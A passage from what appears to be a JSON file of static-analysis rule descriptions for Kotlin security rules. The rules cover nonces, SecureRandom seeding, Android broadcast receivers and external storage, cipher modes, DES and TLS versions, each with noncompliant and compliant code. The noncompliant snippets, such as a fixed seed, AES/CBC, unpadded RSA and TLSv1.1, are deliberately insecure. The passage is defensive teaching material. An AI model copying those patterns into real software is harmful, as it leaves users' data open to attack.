approach or using a 'Random Bit Generator (RBG)'.</p>\n<h4>Generating nonces using random number generation</h4>\n<p>When using a randomized approach, NIST recommends a nonce of at least 96 bits using a cryptographically secure pseudorandom number generator\n(CSPRNG.) Such a generator can create output with a sufficiently low probability of the same number being output twice (also called a\n<em>collision</em>) for a long time. However, after 2<sup>32</sup> generated numbers for the same key, NIST recommends rotating this key for a new\none. After that amount of generated numbers, the probability of a collision is high enough to be considered insecure.</p>\n<p>The code example above demonstrates how CSPRNGs can be used to generate nonces.</p>\n<p>Be careful to use a random number generator that is sufficiently secure. Default (non-cryptographically secure) RNGs might be more prone to\ncollisions in their output, which is catastrophic for counter-based encryption modes.</p>\n<h4>Deterministically generating nonces</h4>\n<p>One method to prevent the same IV from being used multiple times for the same key is to update the IV in a deterministic way after each encryption.\nThe most straightforward deterministic method for this is a counter.</p>\n<p>The way this works is simple: for any key, the first IV is the number zero. After this IV is used to encrypt something with a key, it is\nincremented for that key (and is now equal to 1). Although this requires additional bookkeeping, it should guarantee that for each encryption key, an\nIV is never repeated.</p>\n<p>For a secure implementation, NIST suggests generating these nonces in two parts: a fixed field and an invocation field. The fixed field should be\nused to identify the device executing the encryption (for example, it could contain a device ID), such that for one key, no two devices can generate\nthe same nonce. The invocation field contains the counter as described above. For a 96-bit nonce, NIST recommends (but does not require) using a\n32-bit fixed field and a 64-bit invocation field. Additional details can be found in the <a\nhref=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">NIST Special Publication 800-38D</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/323\">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38c.pdf\">NIST, SP-800-38C</a> - Recommendation for Block Cipher\n  Modes of Operation: The CCM Mode for Authentication and Confidentiality </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">NIST, SP-800-38D</a> - Recommendation for Block Cipher\n  Modes of Operation: Galois/Counter Mode (GCM) and GMAC </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S4347": {
        "name": "\"SecureRandom\" seeds should not be predictable",
        "htmlDesc": "<p>When using <code>SecureRandom</code>, it is important not to use predictable seeds. This class is used to generate cryptographically strong random\nnumbers. Using a predictable seed will make its output predictable as well, which counteracts the use case of <code>SecureRandom</code>.</p>\n<h2>Why is this an issue?</h2>\n<p><code>java.security.SecureRandom</code> is often used to generate random values for cryptographic algorithms. When a random number generator is\nused for cryptographic purposes, the generated numbers must be as random and unpredictable as possible. When <code>SecureRandom</code> is improperly\nseeded with a constant or a predictable value, its output will also be predictable.</p>\n<p>This can have severe security implications for cryptographic operations that rely on the randomness of the generated numbers. By using a\npredictable seed, an attacker can potentially guess or deduce the generated numbers, compromising the security of whatever cryptographic algorithm\nrelies on <code>SecureRandom</code>.</p>\n<h3>What is the potential impact?</h3>\n<p>It is crucial to understand that the strength of cryptographic algorithms heavily relies on the quality of the random numbers used. By improperly\nseeding the <code>SecureRandom</code> class, we introduce a significant weakness that can be exploited by attackers.</p>\n<h4>Insecure cryptographic keys</h4>\n<p>One of the primary use cases for the <code>SecureRandom</code> class is generating cryptographic keys. If an attacker can predict the seed used to\ninitialize the SecureRandom instance, they may be able to derive the same keys. Depending on the use case, this can lead to multiple severe outcomes,\nsuch as:</p>\n<ul>\n  <li> Being able to decrypt sensitive documents, leading to privacy breaches or identity theft. </li>\n  <li> Gaining access to a private key used for signing, allowing an attacker to forge digital signatures and impersonate legitimate entities. </li>\n  <li> Bypassing authentication mechanisms that rely on public-key infrastructure (PKI), which can be abused to gain unauthorized access to systems or\n  networks. </li>\n</ul>\n<h4>Session hijacking and man-in-the-middle attack</h4>\n<p>Another scenario where this vulnerability can be exploited is in the generation of session tokens or nonces for secure communication protocols. If\nan attacker can predict the seed used to generate these tokens, they can impersonate legitimate users or intercept sensitive information.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code uses a cryptographically strong random number generator to generate data that is not cryptographically strong.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.security.SecureRandom\n\nval sr = SecureRandom()\nsr.setSeed(123456L) // Noncompliant\nval v = sr.nextInt()\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport java.security.SecureRandom\n\nval sr = SecureRandom(\"abcdefghijklmnop\".toByteArray(charset(\"us-ascii\"))) // Noncompliant\nval v = sr.nextInt()\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.security.SecureRandom\n\nval sr = SecureRandom()\nval v = sr.nextInt()\n</pre>\n<p>This solution is available for JDK 1.8 and higher.</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport java.security.SecureRandom\n\nval sr = SecureRandom.getInstanceStrong()\nval v = sr.nextInt()\n</pre>\n<h3>How does this work?</h3>\n<p>When the randomly generated data needs to be cryptographically strong, <code>SecureRandom</code> is the correct class to use. However, its\ndocumentation also cites that \"any seed material passed to a <code>SecureRandom</code> object must be unpredictable\". When no seed is passed by the\nuser to the object, the <code>SecureRandom</code> object chooses an unpredictable seed by default. Therefore, the easiest way to fix the issue is to\nuse the default constructor without any calls to <code>SecureObject.setSeed()</code>.</p>\n<p>To go the extra mile, <code>SecureObject.getInstanceStrong()</code> returns an instance of <code>SecureObject</code> that is guaranteed to use a\nstrong algorithm for its number generation.</p>\n<p>If the randomly generated data is not used for cryptographic purposes and is not business critical, it may be a better choice to use\n<code>java.util.Random</code> instead. In this case, setting a predictable seed may be acceptable depending on the situation.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation - <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/security/SecureRandom.html\">Class\n  <code>java.security.SecureRandom</code></a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/330\">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/332\">MITRE, CWE-332</a> - Insufficient Entropy in PRNG </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/336\">MITRE, CWE-336</a> - Same Seed in Pseudo-Random Number Generator (PRNG) </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/337\">MITRE, CWE-337</a> - Predictable Seed in Pseudo-Random Number Generator (PRNG) </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded\">CERT, MSC63J.</a> - Ensure that\n  SecureRandom is properly seeded </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S5322": {
        "name": "Receiving intents is security-sensitive",
        "htmlDesc": "<p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led\nin the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677\">CVE-2019-1677</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275\">CVE-2015-1275</a> </li>\n</ul>\n<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will\nstart the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>\n<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications\nthat can send broadcasts to the receiver.</p>\n<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a\nbroadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a\nmessage to the receiver.</p>\n<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The data extracted from intents is not sanitized. </li>\n  <li> Intents broadcast is not restricted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Restrict the access to broadcasted intents. See the <a\nhref=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> for more\ninformation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.BroadcastReceiver\nimport android.content.Context\nimport android.content.IntentFilter\nimport android.os.Build\nimport android.os.Handler\nimport androidx.annotation.RequiresApi\n\nclass MyIntentReceiver {\n    @RequiresApi(api = Build.VERSION_CODES.O)\n    fun register(\n        context: Context, receiver: BroadcastReceiver?,\n        filter: IntentFilter?,\n        scheduler: Handler?,\n        flags: Int\n    ) {\n        context.registerReceiver(receiver, filter) // Sensitive\n        context.registerReceiver(receiver, filter, flags) // Sensitive\n\n        // Broadcasting intent with \"null\" for broadcastPermission\n        context.registerReceiver(receiver, filter, null, scheduler) // Sensitive\n        context.registerReceiver(receiver, filter, null, scheduler, flags) // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.BroadcastReceiver\nimport android.content.Context\nimport android.content.IntentFilter\nimport android.os.Build\nimport android.os.Handler\nimport androidx.annotation.RequiresApi\n\nclass MyIntentReceiver {\n    @RequiresApi(api = Build.VERSION_CODES.O)\n    fun register(\n        context: Context, receiver: BroadcastReceiver?,\n        filter: IntentFilter?,\n        broadcastPermission: String?,\n        scheduler: Handler?,\n        flags: Int\n    ) {\n        context.registerReceiver(receiver, filter, broadcastPermission, scheduler)\n        context.registerReceiver(receiver, filter, broadcastPermission, scheduler, flags)\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec Verification\n  Standard</a> - Platform Interaction Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">OWASP Mobile Top 10 2016 Category M1</a> - Improper\n  Platform Usage </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/925\">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/926\">MITRE, CWE-926</a> - Improper Export of Android Application Components </li>\n  <li> <a href=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> -\n  Broadcast Overview - Security considerations and best practices </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S5324": {
        "name": "Accessing Android external storage is security-sensitive",
        "htmlDesc": "<p>Storing data locally is a common task for mobile applications. Such data includes files among other things. One convenient way to store files is to\nuse the external file storage which usually offers a larger amount of disc space compared to internal storage.</p>\n<p>Files created on the external storage are globally readable and writable. Therefore, a malicious application having the permissions\n<code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> could try to read sensitive information from the files that other\napplications have stored on the external storage.</p>\n<p>External storage can also be removed by the user (e.g when based on SD card) making the files unavailable to the application.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Your application uses external storage to:</p>\n<ul>\n  <li> store files that contain sensitive data. </li>\n  <li> store files that are not meant to be shared with other application. </li>\n  <li> store files that are critical for the application to work. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use internal storage whenever possible as the system prevents other apps from accessing this location. </li>\n  <li> Only use external storage if you need to share non-sensitive files with other applications. </li>\n  <li> If your application has to use the external storage to store sensitive data, make sure it encrypts the files using <a\n  href=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedFile\">EncryptedFile</a>. </li>\n  <li> Data coming from external storage should always be considered untrusted and should be validated. </li>\n  <li> As some external storage can be removed, make sure to never store files on it that are critical for the usability of your application. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.Context\n\nclass AccessExternalFiles {\n\n    fun accessFiles(Context context) {\n        context.getExternalFilesDir(null) // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.Context\nimport android.os.Environment\n\nclass AccessExternalFiles {\n\n    fun accessFiles(Context context) {\n        context.getFilesDir()\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>\n  <li> <a href=\"https://developer.android.com/privacy-and-security/security-tips#ExternalStorage\">Android Security tips on external file storage</a>\n  </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard</a> - Data Storage and Privacy Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">OWASP Mobile Top 10 2016 Category M2</a> - Insecure\n  Data Storage </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/312\">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>\n<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>\n<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Java Cryptographic Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher\nimport javax.crypto.NoSuchPaddingException\nimport java.security.NoSuchAlgorithmException\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val aes = Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); // Noncompliant\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    }\n}\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher\nimport javax.crypto.NoSuchPaddingException\nimport java.security.NoSuchAlgorithmException\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val rsa = Cipher.getInstance(\"RSA/None/NoPadding\"); // Noncompliant\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher\nimport javax.crypto.NoSuchPaddingException\nimport java.security.NoSuchAlgorithmException\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val aes = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    }\n}\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher\nimport javax.crypto.NoSuchPaddingException\nimport java.security.NoSuchAlgorithmException\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val rsa = Cipher.getInstance(\"RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING\");\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: Use Galois/Counter mode (GCM)</h4>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>\n<p>is considered more straightforward to use AES-GCM directly instead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection. </li>\n  <li> Security during transmission or on storage devices. </li>\n  <li> Data integrity, general trust, and authentication. </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Java Cryptographic Extension</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.NoSuchPaddingException\nimport java.security.NoSuchAlgorithmException\nimport javax.crypto.Cipher\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val des = Cipher.getInstance(\"DES\") // Noncompliant\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.crypto.NoSuchPaddingException\nimport java.security.NoSuchAlgorithmException\nimport javax.crypto.Cipher\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        val aes = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are\nall considered weak by the cryptographic community, and are officially deprecated:</p>\n<ul>\n  <li> SSL versions 1.0, 2.0 and 3.0 </li>\n  <li> TLS versions 1.0 and 1.1 </li>\n</ul>\n<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform\nmathematical attacks on this data after obtaining it by other means.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptographic Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.net.ssl.SSLContext;\nimport java.security.NoSuchAlgorithmException;\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        SSLContext.getInstance(\"TLSv1.1\"); // Noncompliant\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.net.ssl.SSLContext;\nimport java.security.NoSuchAlgorithmException;\n\nfun main(args: Array&lt;String&gt;) {\n    try {\n        SSLContext.getInstance(\"TLSv1.2\");\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic\ncommunity.</p>\n<p>The best choices at the moment are the following.</p>\n<h4>Use TLS v1.2 or TLS v1.3</h4>\n<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>\n<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not\nyet have TLS v1.3 support.</p>\n<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are\ndeprecated as insecure.</p>\n<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS\nversions, and improves performance.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a 